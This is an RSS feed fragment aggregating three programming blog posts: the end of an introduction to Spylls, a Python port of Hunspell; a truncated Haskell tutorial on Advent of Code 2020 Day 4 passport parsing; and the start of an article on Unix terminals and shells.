  <li>A closer look into Hunspell‚Äôs dictionary format. It is the most widespread open dictionary format in the world, and we‚Äôll see what linguistic and algorithmic information it <em>potentially</em> can carry, and what part of it is actually used in existing dictionaries</li>
  <li>Some details on Spylls implementation process and results</li>
  <li>Closing thoughts on the big picture of word-by-word spellchecker problem, and Hunspell‚Äôs approach to it</li>
</ul>

<h3 id="what-is-hunspell">What is Hunspell?</h3>

<blockquote>
  <p><strong>Note:</strong> The information on Hunspell‚Äôs origins and history is mostly my guesses, following partial and incomplete sources everywhere.</p>
</blockquote>

<p>Hunspell (<small><a href="https://en.wikipedia.org/wiki/Hunspell">Wikpedia article</a></small>), initially <strong>Hun</strong>garian spellchecker, emerged as an alternative for previously existing aspell/ispell/myspell somewhere in 2002 (I guess?). It was created by L√°szl√≥ N√©meth, in a need of supporting languages with complicated suffixing/prefixing rules and word compounding (such as Hungarian). Hunspell‚Äôs design seemingly proved itself to be flexible enough to support most of the world‚Äôs languages, and in a few years, it became the most used spellchecker in the world. You have most probably used it even if you‚Äôve never heard the name before today: Hunspell is the default spellchecking engine in Chrome and Firefox, Libre/OpenOffice, Adobe products, and macOS (not an exhaustive list). Dictionaries in Hunspell format exist for almost all actively used languages for which the concept of word-by-word spellchecking makes sense<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>.</p>

<p>Currently, Hunspell is maintained <a href="https://github.com/hunspell/hunspell">on GitHub</a> (repo has only around 1k stars, will you believe it?). It seems that maintenance is not that easy if you‚Äôll weight the number of open issues and PRs, and the latest commits timeline: at the time of writing it (Jan 2021), the last commit to master was of May 2020, and the last release was 1.7 on Dec 2018. Hunspell‚Äôs codebase is mostly ‚Äúold-school‚Äù C++. It is being slowly modernized and it has very few comments; there are thousands of two-branch <code>if</code>s to handle non-Unicode and Unicode text separately. There is also an attempt to rewrite Hunspell from scratch in a modern C++, which at some point was developed under the <code>hunspell</code> GitHub organization. Now it is independent and called <a href="https://github.com/nuspell/nuspell">nuspell</a> (and, while not yet supporting all of the Hunspell features, already ‚Äúachieved‚Äù version 4.2.0).</p>

<p>Obviously, there are open-source spellcheckers other than Hunspell. GNU aspell (that at one point was superseded by Hunspell, but still holds its ground in English suggestion quality), to name one of the older ones; but also there are novel approaches, like <a href="https://github.com/wolfgarbe/SymSpell">SymSpell</a>, claiming to be ‚Äú1 million times faster‚Äù or ML-based <a href="https://github.com/bakwc/JamSpell">JamSpell</a>, claiming to be much more accurate.</p>

<p>And yet, what makes Hunspell stand out is its coverage of the world‚Äôs languages. It is not ideal, but the amount of dictionaries ready to use immediately, and amount of <em>experience</em> of dealing with typical problems and corner cases, coded into the codebase, is hard to beat.</p>

<h3 id="why-rewrite-it">Why rewrite it?</h3>

<p>As I‚Äôve already stated above, the goal of the Spylls project was to create an <em>explanatory</em> rewrite: E.g., the ‚Äúretelling‚Äù of how Hunspell works in a way that is easy to follow and to play with.</p>

<p>The necessity of this approach came to me from three facts:</p>

<ol>
  <li>Hunspell is used almost everywhere and is taken for granted;</li>
  <li>It is much more complicated than one might naively expect;</li>
  <li>This complexity‚Äîand years of human work that was spent growing the project‚Äîis notoriously hard to follow through the Hunspell‚Äôs codebase and grasp in full.</li>
</ol>

<p>In other words, I wanted to <strong>make the knowledge behind Hunspell more open</strong>.</p>

<p>The way I have chosen was not, of course, the only one possible. I could‚Äôve just read through the original code and write a series of articles (or, rather, a book?) on how it works. I could‚Äôve thoroughly commented and republished the original source code. But I felt that <em>reimplementing</em> is the only way of understanding what‚Äôs and why‚Äôs of the algorithms (at least for somebody not being a Hunspell‚Äôs core developer); and that implementation in a high-level language will allow focusing on words and language-related algorithms, not memory management or fighting with Unicode.</p>

<blockquote>
  <p>Note that there are also a few ‚Äúpragmatic‚Äù ports of Hunspell into other languages (in order to use it in environments where C++ dependency is undesireable), namely <a href="https://github.com/aarondandy/WeCantSpell.Hunspell">WeCantSpell.Hunspell</a> in C# and <a href="https://github.com/wooorm/nspell">nspell</a> in JS (very incomplete); and aforementioned <a href="https://github.com/nuspell/nuspell">nuspell</a> can also be considered a ‚Äúport‚Äù (from legacy C++ to a modern one).</p>
</blockquote>

<h3 id="why-python">Why Python?</h3>

<p>My language of choice is Ruby. It was also the first language that I‚Äôve tried to port Hunspell into. I‚Äôd be happy to proceed with Ruby if my goal has been just a ‚Äúpragmatic‚Äù library. And yet, when I decided that my goal is to make the knowledge of Hunspell‚Äôs algorithms accessible to a wide audience, I understood that Ruby is not the best choice: language reputation (slightly esoteric and mostly-for-web) would make my project lest noticeable; and my preferred coding style (mix of OO and functional, with lots of small immutable domain objects and fluent chains of iterators), while allowing me to be very effective, would make the code less accessible to other languages users.</p>

<p>What I needed was a high-level language, with as low boilerplate as possible; as mainstream as possible; as easy to experiment with and prototype as possible. Without diving into too much argument here, Python and modern JavaScript seemed to be the most suitable options, and, to be honest, Python was just closer to my soul. So, here we are!</p>

<p>The code style is mostly imperative (as it corresponds to how Hunspell is structured), with large-ish, but clearly structured methods, and a small number of classes/objects (mostly they are either ‚Äúwhole algorithm as a class‚Äù or almost-passive ‚Äústructs‚Äù ‚Äì or, in Python, dataclasses). I tried to limit myself in the usage of complex Python-specific features (like functools or itertools), but have a decent use of ‚Äúlist comprehensions‚Äù (as they are quite readable and Pythonic) and generators (lazy lists). Overall, I wanted the code to be good Python, but not too smart. Whether I succeeded, is up to you to decide.</p>

<p>Currently, <a href="https://github.com/zverok/spylls">Spylls</a> has <strong>‚âà1.5k lines of library code</strong> in 14 files. It conforms (with <a href="https://spylls.readthedocs.io/en/latest/#completeness">some reservations</a>) to all Hunspell‚Äôs integrational tests. Those tests look like a set of files each, consisting of ‚Äútest dictionary + what words should be considered good, what words should be considered bad, what should be suggested instead of the bad words‚Äù, and there are <strong>127 of such sets to pass</strong>. There are <strong>2 thousand comment lines</strong> in the code, explaining thoroughly every detail of the algorithm and rendered at the <a href="https://spylls.readthedocs.io/en/latest/hunspell.html">Spylls documentation site</a>; note that besides docstrings at the beginning of each class and method, there are also inline comments in code‚Äîthat‚Äôs why the documentation site uses custom theme with inline ‚ÄúShow code‚Äù feature.</p>

<hr>

<p>With this being said, I am wrapping up the introductory post.</p>

<p><strong>In the <a href="https://zverok.github.io/blog/2021-01-09-spellchecker-2.html">next series</a>: An introduction to Hunspell‚Äôs ‚Äúlookup‚Äù and ‚Äúsuggest‚Äù concepts; and deeper dive into the lookup.</strong></p>


  </article></div>]]>
            </description>
            <link>https://zverok.github.io/blog/2021-01-05-spellchecker-1.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789099</guid>
            <pubDate>Fri, 15 Jan 2021 10:19:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Permutate Parsers, Don't Validate]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25789061">thread link</a>) | @gbrown_
<br/>
January 15, 2021 | https://juliu.is/permutate-parsers/ | <a href="https://web.archive.org/web/*/https://juliu.is/permutate-parsers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://lexi-lambda.github.io/blog/2019/11/05/parse-don-t-validate/">‚ÄúParse, don‚Äôt
validate‚Äù</a>
has been one of my favourite programming articles for some time. The main
gist of the article is that, when writing in a type-driven fashion, your
snappy slogan should be:</p>
<blockquote>
<p>Parse, don‚Äôt validate.</p>
</blockquote>
<p>The core difference between parsing and validating can be explained by
looking at two very similar functions:</p>
<div data-language="haskell"><pre><code><span>parseInt</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>Maybe</span> <span>Int</span>
<span>parseInt</span> <span>str</span> <span>=</span> <span>Text.Read.readMaybe</span> <span>str</span>

<span>validateInt</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>Bool</span>
<span>validateInt</span> <span>str</span> <span>=</span> <span>Text.Read.readMaybe</span> <span>str</span> <span>/=</span> <span>Nothing</span></code></pre></div>
<p>As you can see, they look very similar. The main difference is that
<code>parseInt</code> returns a useful value, the <code>Int</code> that we wanted to parse, while
<code>validateInt</code> takes that useful value and throws it away. This is also
mentioned in the wonderful <a href="https://kowainik.github.io/posts/haskell-mini-patterns#evidence">Haskell Mini-Patterns
Handbook</a>
as the ‚ÄúEvidence‚Äù pattern.</p>
<blockquote>
<p>The key issue here is that by calling a function that returns Bool you
lose the information about earlier performed validation. Instead, you can
keep this information by explicitly pattern-matching on the validation or
result.</p>
</blockquote>
<p>In this post, I would like to go through a practical example that shows the
power of bringing this concept to its limits. Which brings us to‚Ä¶</p>
<h2>Advent of Code 2020, Day 4</h2>
<p>We <a href="https://adventofcode.com/2020/day/4">are tasked</a> with parsing a batch
of passports composed of these fields:</p>
<div data-language="plain"><pre><code>- byr (Birth Year)
- iyr (Issue Year)
- eyr (Expiration Year)
- hgt (Height)
- hcl (Hair Color)
- ecl (Eye Color)
- pid (Passport ID)
- cid (Country ID)</code></pre></div>
<p>All the fields are required except for the <code>cid</code> field, which is optional.
Note that the fields can be written in any order, this will be important
later. Our batch is composed of multiple passports separated by empty lines
(the <code>input.txt</code>):</p>
<div data-language="plain"><pre><code>ecl:gry pid:860033327 eyr:2020 hcl:#fffffd
byr:1937 iyr:2017 cid:147 hgt:183cm

iyr:2013 ecl:amb cid:350 eyr:2023 pid:028048884
hcl:#cfa07d byr:1929

hcl:#ae17e1 iyr:2013
eyr:2024
ecl:brn pid:760753108 byr:1931
hgt:179cm

hcl:#cfa07d eyr:2025 pid:166559648
iyr:2011 ecl:brn hgt:59in</code></pre></div>
<ul>
<li>The first passport is <em>valid</em> - all required fields are present.</li>
<li>The second passport is <em>invalid</em> - it is missing <code>hgt</code>.</li>
<li>The third passport is interesting: the only missing field is the optional <code>cid</code>, which makes it <em>valid</em>.</li>
<li>The fourth passport is missing two fields, <code>cid</code> and <code>byr</code>. Missing <code>cid</code> is fine, but missing <code>byr</code> is not, so this passport is <em>invalid</em>.</li>
</ul>
<p>The challenge is to count <strong>how many passports</strong> are <strong>valid</strong> in the given
batch.</p>
<p>Let‚Äôs write some code to open the file and parse each group of passport
fields:</p>
<div data-language="haskell"><pre><code><span>module</span> <span>Main</span> <span>where</span>

<span><span>import</span> <span>qualified</span> Data.List.Split <span>as</span> S</span>

<span>main</span> <span>::</span> <span>IO</span> <span>(</span><span>)</span>
<span>main</span> <span>=</span> <span>do</span>
  <span>contents</span> <span>&lt;-</span> <span>readFile</span> <span>"input.txt"</span>
  <span>let</span> <span>entries</span> <span>=</span> <span>map</span> <span>parseEntry</span> <span>(</span><span>S.splitOn</span> <span>"\n\n"</span> <span>contents</span><span>)</span>
  <span>print</span> <span>entries</span>

<span>data</span> <span>PassportEntry</span> <span>=</span> <span>PassportEntry</span>
  <span>deriving</span> <span>(</span><span>Show</span><span>)</span>

<span>parseEntry</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>PassportEntry</span>
<span>parseEntry</span> <span>text</span> <span>=</span> <span>undefined</span></code></pre></div>
<p>Nothing too fancy here, we‚Äôre using <code>Data.List.Split</code> from the <code>split</code>
package to do the heavy lifting. And the implementation of <code>parseEntry</code> has
been conveniently stubbed so that the code compiles.</p>
<p>Now how should our <code>PassportEntry</code> data structure look like? I‚Äôd love to
eventually represent passports as:</p>
<div data-language="haskell"><pre><code><span>data</span> <span>Passport</span> <span>=</span> <span>Passport</span>
  <span>{</span> <span>birthYear</span> <span>::</span> <span>Int</span><span>,</span>
    <span>issueYear</span> <span>::</span> <span>Int</span><span>,</span>
    <span>expirationYear</span> <span>::</span> <span>Int</span><span>,</span>
    <span>height</span> <span>::</span> <span>String</span><span>,</span>
    <span>hairColor</span> <span>::</span> <span>String</span><span>,</span>
    <span>eyeColor</span> <span>::</span> <span>String</span><span>,</span>
    <span>passportId</span> <span>::</span> <span>String</span><span>,</span>
    <span>countryId</span> <span>::</span> <span>Maybe</span> <span>Int</span>
  <span>}</span></code></pre></div>
<p>If we imagine parsing each field sequentially, we can see that we won‚Äôt be
able to construct this data structure in a single operation. We‚Äôll have to
accumulate the data up until we‚Äôre ready to create a proper <code>Passport</code>.</p>
<p>One way to store the fields is to insert them into a hash. First of all,
we‚Äôre going to use a custom data type to represent the keys of the hash.
Why is that? We really don‚Äôt want to be making typos later when comparing
raw strings like <code>"ecl"</code> and <code>"elc"</code>. We‚Äôll use a <code>HashMap</code> from the
<code>Data.HashMap.Strict</code> module:</p>
<div data-language="haskell"><pre><code><span><span>import</span> <span>qualified</span> Data.HashMap.Strict <span>as</span> HM</span>

<span>data</span> <span>PassportField</span>
  <span>=</span> <span>BirthYear</span>
  <span>|</span> <span>IssueYear</span>
  <span>|</span> <span>ExpirationYear</span>
  <span>|</span> <span>Height</span>
  <span>|</span> <span>HairColor</span>
  <span>|</span> <span>EyeColor</span>
  <span>|</span> <span>PassportId</span>
  <span>|</span> <span>CountryId</span>
  <span>deriving</span> <span>(</span><span>Eq</span><span>,</span> <span>Show</span><span>)</span>

<span>type</span> <span>PassportEntry</span> <span>=</span> <span>HM.HashMap</span> <span>PassportField</span> <span>String</span></code></pre></div>
<p>Of course things can‚Äôt be that easy. We also need to make our type
implement the <code>Hashable</code> typeclass:</p>
<div data-language="haskell"><pre><code>

<span><span>import</span> <span>qualified</span> Data.HashMap.Strict <span>as</span> HM</span>
<span><span>import</span> Data.Hashable</span>
<span><span>import</span> GHC.Generics</span> <span>(</span><span>Generic</span><span>)</span>

<span>data</span> <span>PassportField</span>
  <span>=</span> <span>BirthYear</span>
  <span>|</span> <span>IssueYear</span>
  <span>|</span> <span>ExpirationYear</span>
  <span>|</span> <span>Height</span>
  <span>|</span> <span>HairColor</span>
  <span>|</span> <span>EyeColor</span>
  <span>|</span> <span>PassportId</span>
  <span>|</span> <span>CountryId</span>
  <span>deriving</span> <span>(</span><span>Eq</span><span>,</span> <span>Show</span><span>,</span> <span>Generic</span><span>)</span>

<span>instance</span> <span>Hashable</span> <span>PassportField</span>

<span>type</span> <span>PassportEntry</span> <span>=</span> <span>HM.HashMap</span> <span>PassportField</span> <span>String</span></code></pre></div>
<p>Don‚Äôt worry about what we‚Äôve added. Just take them as God-given truths. üëº</p>
<p>Okay, now we can implement our <code>parseEntry</code> function:</p>
<div data-language="haskell"><pre><code><span><span>import</span> Data.Maybe</span> <span>(</span><span>mapMaybe</span><span>)</span>
<span><span>import</span> <span>qualified</span> Data.Char <span>as</span> Char</span>

<span>parseEntry</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>PassportEntry</span>
<span>parseEntry</span> <span>line</span> <span>=</span>
  <span>HM.fromList</span> <span>$</span>
    <span>mapMaybe</span> <span>parseTag</span> <span>$</span>
      <span>S.splitWhen</span> <span>Char</span><span>.</span><span>isSpace</span> <span>line</span>

<span>parseTag</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>Maybe</span> <span>(</span><span>PassportField</span><span>,</span> <span>String</span><span>)</span>
<span>parseTag</span> <span>value</span> <span>=</span>
  <span>case</span> <span>S.splitOn</span> <span>":"</span> <span>value</span> <span>of</span>
    <span>[</span><span>"byr"</span><span>,</span> <span>byr</span><span>]</span> <span>-&gt;</span>
      <span>Just</span> <span>(</span><span>BirthYear</span><span>,</span> <span>byr</span><span>)</span>
    <span>[</span><span>"iyr"</span><span>,</span> <span>iyr</span><span>]</span> <span>-&gt;</span>
      <span>Just</span> <span>(</span><span>IssueYear</span><span>,</span> <span>iyr</span><span>)</span>
    <span>[</span><span>"eyr"</span><span>,</span> <span>eyr</span><span>]</span> <span>-&gt;</span>
      <span>Just</span> <span>(</span><span>ExpirationYear</span><span>,</span> <span>eyr</span><span>)</span>
    <span>[</span><span>"hgt"</span><span>,</span> <span>height</span><span>]</span> <span>-&gt;</span>
      <span>Just</span> <span>(</span><span>Height</span><span>,</span> <span>height</span><span>)</span>
    <span>[</span><span>"hcl"</span><span>,</span> <span>color</span><span>]</span> <span>-&gt;</span>
      <span>Just</span> <span>(</span><span>HairColor</span><span>,</span> <span>color</span><span>)</span>
    <span>[</span><span>"ecl"</span><span>,</span> <span>color</span><span>]</span> <span>-&gt;</span>
      <span>Just</span> <span>(</span><span>EyeColor</span><span>,</span> <span>color</span><span>)</span>
    <span>[</span><span>"pid"</span><span>,</span> <span>pid</span><span>]</span> <span>-&gt;</span>
      <span>Just</span> <span>(</span><span>PassportId</span><span>,</span> <span>pid</span><span>)</span>
    <span>[</span><span>"cid"</span><span>,</span> <span>cid</span><span>]</span> <span>-&gt;</span>
      <span>Just</span> <span>(</span><span>CountryId</span><span>,</span> <span>cid</span><span>)</span>
    <span>_</span> <span>-&gt;</span>
      <span>Nothing</span></code></pre></div>
<p>We try to parse each field (such as <code>byr:2002</code>) into a <code>PassportField</code>
type, then end up building a hash using <code>HM.fromList</code>. We can take this for
a spin:</p>
<div data-language="haskell"><pre><code><span>Prelude</span><span>&gt;</span> <span>:</span><span>l</span> <span>Main.hs</span>

<span>*</span><span>Main</span><span>&gt;</span> <span>main</span>
<span>[</span> <span>fromList</span>
    <span>[</span> <span>(</span><span>CountryId</span><span>,</span> <span>"147"</span><span>)</span><span>,</span>
      <span>(</span><span>BirthYear</span><span>,</span> <span>"1937"</span><span>)</span><span>,</span>
      <span>(</span><span>IssueYear</span><span>,</span> <span>"2017"</span><span>)</span><span>,</span>
      <span>(</span><span>HairColor</span><span>,</span> <span>"#fffffd"</span><span>)</span><span>,</span>
      <span>(</span><span>ExpirationYear</span><span>,</span> <span>"2020"</span><span>)</span><span>,</span>
      <span>(</span><span>EyeColor</span><span>,</span> <span>"gry"</span><span>)</span><span>,</span>
      <span>(</span><span>Height</span><span>,</span> <span>"183cm"</span><span>)</span><span>,</span>
      <span>(</span><span>PassportId</span><span>,</span> <span>"860033327"</span><span>)</span>
    <span>]</span><span>,</span>
  <span>fromList</span>
    <span>[</span> <span>(</span><span>CountryId</span><span>,</span> <span>"350"</span><span>)</span><span>,</span>
      <span>(</span><span>BirthYear</span><span>,</span> <span>"1929"</span><span>)</span><span>,</span>
      <span>(</span><span>IssueYear</span><span>,</span> <span>"2013"</span><span>)</span><span>,</span>
      <span>(</span><span>HairColor</span><span>,</span> <span>"#cfa07d"</span><span>)</span><span>,</span>
      <span>(</span><span>ExpirationYear</span><span>,</span> <span>"2023"</span><span>)</span><span>,</span>
      <span>(</span><span>EyeColor</span><span>,</span> <span>"amb"</span><span>)</span><span>,</span>
      <span>(</span><span>PassportId</span><span>,</span> <span>"028048884"</span><span>)</span>
    <span>]</span><span>,</span>
  <span>fromList</span>
    <span>[</span> <span>(</span><span>BirthYear</span><span>,</span> <span>"1931"</span><span>)</span><span>,</span>
      <span>(</span><span>IssueYear</span><span>,</span> <span>"2013"</span><span>)</span><span>,</span>
      <span>(</span><span>HairColor</span><span>,</span> <span>"#ae17e1"</span><span>)</span><span>,</span>
      <span>(</span><span>ExpirationYear</span><span>,</span> <span>"2024"</span><span>)</span><span>,</span>
      <span>(</span><span>EyeColor</span><span>,</span> <span>"brn"</span><span>)</span><span>,</span>
      <span>(</span><span>Height</span><span>,</span> <span>"179cm"</span><span>)</span><span>,</span>
      <span>(</span><span>PassportId</span><span>,</span> <span>"760753108"</span><span>)</span>
    <span>]</span><span>,</span>
  <span>fromList</span>
    <span>[</span> <span>(</span><span>IssueYear</span><span>,</span> <span>"2011"</span><span>)</span><span>,</span>
      <span>(</span><span>HairColor</span><span>,</span> <span>"#cfa07d"</span><span>)</span><span>,</span>
      <span>(</span><span>ExpirationYear</span><span>,</span> <span>"2025"</span><span>)</span><span>,</span>
      <span>(</span><span>EyeColor</span><span>,</span> <span>"brn"</span><span>)</span><span>,</span>
      <span>(</span><span>Height</span><span>,</span> <span>"59in"</span><span>)</span><span>,</span>
      <span>(</span><span>PassportId</span><span>,</span> <span>"166559648"</span><span>)</span>
    <span>]</span>
<span>]</span></code></pre></div>
<p>Nice and tidy! ü¶æ</p>
<p>Now our goal is to verify which one of these groups is valid. First of all,
we should define a list of required fields:</p>
<div data-language="haskell"><pre><code><span>requiredFields</span> <span>::</span> <span>[</span><span>PassportField</span><span>]</span>
<span>requiredFields</span> <span>=</span>
  <span>[</span> <span>BirthYear</span><span>,</span>
    <span>IssueYear</span><span>,</span>
    <span>ExpirationYear</span><span>,</span>
    <span>Height</span><span>,</span>
    <span>HairColor</span><span>,</span>
    <span>EyeColor</span><span>,</span>
    <span>PassportId</span>
  <span>]</span></code></pre></div>
<p>We can then define a validation function:</p>
<div data-language="haskell"><pre><code><span>isEntryValid</span> <span>::</span> <span>PassportEntry</span> <span>-&gt;</span> <span>Bool</span>
<span>isEntryValid</span> <span>entry</span> <span>=</span>
  <span>all</span> <span>(</span><span>`HM.member`</span> <span>entry</span><span>)</span> <span>requiredFields</span></code></pre></div>
<p>And change our main function to use that:</p>
<div data-language="haskell"><pre><code><span>main</span> <span>::</span> <span>IO</span> <span>(</span><span>)</span>
<span>main</span> <span>=</span> <span>do</span>
  <span>contents</span> <span>&lt;-</span> <span>readFile</span> <span>"input.txt"</span>
  <span>let</span> <span>entries</span> <span>=</span> <span>map</span> <span>parseEntry</span> <span>(</span><span>S.splitOn</span> <span>"\n\n"</span> <span>contents</span><span>)</span>
  <span>print</span> <span>$</span> <span>length</span> <span>$</span> <span>filter</span> <span>isEntryValid</span> <span>entries</span></code></pre></div>
<p>Running this yields <code>2</code>, which is the correct answer!
<a href="https://gist.github.com/Arkham/b749043e1622bf01c96eefe303df0b9b">Here</a> is
all the code we have written so far, if you‚Äôre feeling like you need a
refresher.</p>
<h2>Advent of Code 2020, Day 4, Part II</h2>
<p>In the second part of the challenge, these new rules are added:</p>
<div data-language="plain"><pre><code>- byr (Birth Year) - four digits; between 1920 and 2002.
- iyr (Issue Year) - four digits; between 2010 and 2020.
- eyr (Expiration Year) - four digits; between 2020 and 2030.
- hgt (Height) - a number followed by either cm or in:
  - If cm, the number must be between 150 and 193.
  - If in, the number must be between 59 and 76.
- hcl (Hair Color) - a '#' followed by six chars 0-9 or a-f.
- ecl (Eye Color) - one of: amb blu brn gry grn hzl oth.
- pid (Passport ID) - a nine-digit number.
- cid (Country ID) - ignored, missing or not.</code></pre></div>
<p>Here is a new batch for us to peruse:</p>
<div data-language="plain"><pre><code>pid:087499704 hgt:74in ecl:grn iyr:2012 eyr:2030 byr:1980
hcl:#623a2f

eyr:1972 cid:100
hcl:#18171d ecl:amb hgt:170 pid:186cm iyr:2018 byr:1926</code></pre></div>
<ul>
<li>the first passport is <em>valid</em></li>
<li>the second passport is <em>invalid</em> (look at the <code>eyr</code> field)</li>
</ul>
<p>These new requirements are a bit annoying. Our simple approach of checking
if all required fields are present won‚Äôt work any longer. We can instead
implement a <code>isFieldValid</code> function to check if all fields are valid.</p>
<div data-language="haskell"><pre><code><span>isFieldValid</span> <span>::</span> <span>(</span><span>PassportField</span><span>,</span> <span>String</span><span>)</span> <span>-&gt;</span> <span>Bool</span>
<span>isFieldValid</span> <span>(</span><span>field</span><span>,</span> <span>value</span><span>)</span> <span>=</span>
  <span>case</span> <span>field</span> <span>of</span>
    <span>BirthYear</span> <span>-&gt;</span>
      <span>let</span> <span>v</span> <span>=</span> <span>toInt</span> <span>value</span>
       <span>in</span> <span>length</span> <span>value</span> <span>==</span> <span>4</span> <span>&amp;&amp;</span> <span>v</span> <span>&gt;=</span> <span>1920</span> <span>&amp;&amp;</span> <span>v</span> <span>&lt;=</span> <span>2002</span>
    <span>IssueYear</span> <span>-&gt;</span>
      <span>let</span> <span>v</span> <span>=</span> <span>toInt</span> <span>value</span>
       <span>in</span> <span>length</span> <span>value</span> <span>==</span> <span>4</span> <span>&amp;&amp;</span> <span>v</span> <span>&gt;=</span> <span>2010</span> <span>&amp;&amp;</span> <span>v</span> <span>&lt;=</span> <span>2020</span>
    <span>ExpirationYear</span> <span>-&gt;</span>
      <span>let</span> <span>v</span> <span>=</span> <span>toInt</span> <span>value</span>
       <span>in</span> <span>length</span> <span>value</span> <span>==</span> <span>4</span> <span>&amp;&amp;</span> <span>v</span> <span>&gt;=</span> <span>2020</span> <span>&amp;&amp;</span> <span>v</span> <span>&lt;=</span> <span>2030</span>
    <span>Height</span> <span>-&gt;</span>
      <span>case</span> <span>span</span> <span>Char</span><span>.</span><span>isDigit</span> <span>value</span> <span>of</span>
        <span>(</span><span>num</span><span>,</span> <span>"cm"</span><span>)</span> <span>-&gt;</span>
          <span>let</span> <span>n</span> <span>=</span> <span>toInt</span> <span>num</span>
           <span>in</span> <span>n</span> <span>&gt;=</span> <span>150</span> <span>&amp;&amp;</span> <span>n</span> <span>&lt;=</span> <span>193</span>
        <span>(</span><span>num</span><span>,</span> <span>"in"</span><span>)</span> <span>-&gt;</span>
          <span>let</span> <span>n</span> <span>=</span> <span>toInt</span> <span>num</span>
           <span>in</span> <span>n</span> <span>&gt;=</span> <span>59</span> <span>&amp;&amp;</span> <span>n</span> <span>&lt;=</span> <span>76</span>
        <span>_</span> <span>-&gt;</span>
          <span>False</span>
    <span>HairColor</span> <span>-&gt;</span>
      <span>case</span> <span>(</span><span>length</span> <span>value</span><span>,</span> <span>value</span><span>)</span> <span>of</span>
        <span>(</span><span>7</span><span>,</span> <span>'#'</span> <span>:</span> <span>rest</span><span>)</span> <span>-&gt;</span>
          <span>all</span> <span>(</span>`<span>elem</span>` <span>allowedHexChars</span><span>)</span> <span>rest</span>
        <span>_</span> <span>-&gt;</span>
          <span>False</span>
    <span>EyeColor</span> <span>-&gt;</span>
      <span>value</span> `<span>elem</span>` <span>validEyeColors</span>
    <span>PassportId</span> <span>-&gt;</span>
      <span>length</span> <span>value</span> <span>==</span> <span>9</span> <span>&amp;&amp;</span> <span>all</span> <span>Char</span><span>.</span><span>isDigit</span> <span>value</span>
    <span>CountryId</span> <span>-&gt;</span>
      <span>all</span> <span>Char</span><span>.</span><span>isDigit</span> <span>value</span>

<span>toInt</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>Int</span>
<span>toInt</span> <span>=</span> <span>read</span>

<span>validEyeColors</span> <span>::</span> <span>[</span><span>String</span><span>]</span>
<span>validEyeColors</span> <span>=</span>
  <span>[</span><span>"amb"</span><span>,</span> <span>"blu"</span><span>,</span> <span>"brn"</span><span>,</span> <span>"gry"</span><span>,</span> <span>"grn"</span><span>,</span> <span>"hzl"</span><span>,</span> <span>"oth"</span><span>]</span>

<span>allowedHexChars</span> <span>::</span> <span>[</span><span>Char</span><span>]</span>
<span>allowedHexChars</span> <span>=</span>
  <span>[</span><span>'0'</span> <span>..</span> <span>'9'</span><span>]</span> <span>&lt;&gt;</span> <span>[</span><span>'a'</span> <span>..</span> <span>'f'</span><span>]</span></code></pre></div>
<p>Then we can change our <code>isEntryValid</code> to use this function:</p>
<div data-language="haskell"><pre><code><span>isEntryValid</span> <span>::</span> <span>PassportEntry</span> <span>-&gt;</span> <span>Bool</span>
<span>isEntryValid</span> <span>entry</span> <span>=</span>
  <span>requiredFieldsPresent</span> <span>&amp;&amp;</span> <span>allFieldsValid</span>
  <span>where</span>
    <span>requiredFieldsPresent</span> <span>=</span>
      <span>all</span> <span>(</span><span>`HM.member`</span> <span>entry</span><span>)</span> <span>requiredFields</span>

    <span>allFieldsValid</span> <span>=</span>
      <span>all</span> <span>isFieldValid</span> <span>(</span><span>HM.toList</span> <span>entry</span><span>)</span></code></pre></div>
<p>Running this program on our second data sample yields <code>1</code>, and it will be
good enough to solve the Advent of Code challenge and get us those sweet
sweet stars.</p>
<p>üéâ üéâ üéâ</p>
<h2>A moment of reflection</h2>
<p>If we look back at the <a href="https://gist.github.com/Arkham/923df6e872d855101bca4261f7d71e65">current
state</a> of
our ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://juliu.is/permutate-parsers/">https://juliu.is/permutate-parsers/</a></em></p>]]>
            </description>
            <link>https://juliu.is/permutate-parsers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789061</guid>
            <pubDate>Fri, 15 Jan 2021 10:10:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The terminal, the console and the shell ‚Äì what are they?]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25788858">thread link</a>) | @iio7
<br/>
January 15, 2021 | https://www.unixsheikh.com/articles/the-terminal-the-console-and-the-shell-what-are-they.html | <a href="https://web.archive.org/web/*/https://www.unixsheikh.com/articles/the-terminal-the-console-and-the-shell-what-are-they.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>


<p>Published on <span id="pubdate">2021-01-13</span>. Modified on <span id="moddate">2021-01-16</span>.</p>
<p>The other day, as I was going through some of my old notes, I stumbled upon something I had written about the console, the terminal and the shell on Unix-like operating systems. I have decided to rewrite these notes in order to share them here on my website. So without further ado we will now stroll down memory lane and take a quick look at the origins of the Unix terminal and shell. And I will also give my advice to new users on Linux or BSD regarding the choice of terminal emulator and shell.</p>

<p>Table of contents</p>
<ul>
    <li><a href="#the-terminal">The terminal and the console</a>
        <ul>
            <li><a href="#the-virtual-terminal">The virtual terminal</a></li>
        </ul>
    </li>
    <li><a href="#the-terminal-emulator">The terminal emulator</a>
        <ul>
            <li><a href="#xterm">xterm</a></li>
            <li><a href="#st">st</a></li>
            <li><a href="#alacritty">Alacritty</a></li>
            <li><a href="#other-terminal-emulators">Other terminal emulators</a></li>
            <li><a href="#what-terminal-emulator-should-i-use">What terminal emulator should I use?</a></li>
        </ul>
    </li>
    <li><a href="#terminal-multiplexer">Terminal multiplexer</a>
        <ul>
            <li><a href="#tmux-vs-gnu-screen">tmux vs GNU Screen</a></li>
        </ul>
    </li>
    <li><a href="#the-environment-variable-term">The environment variable TERM</a></li>
    <li><a href="#escape-sequences">Escape sequences</a></li>
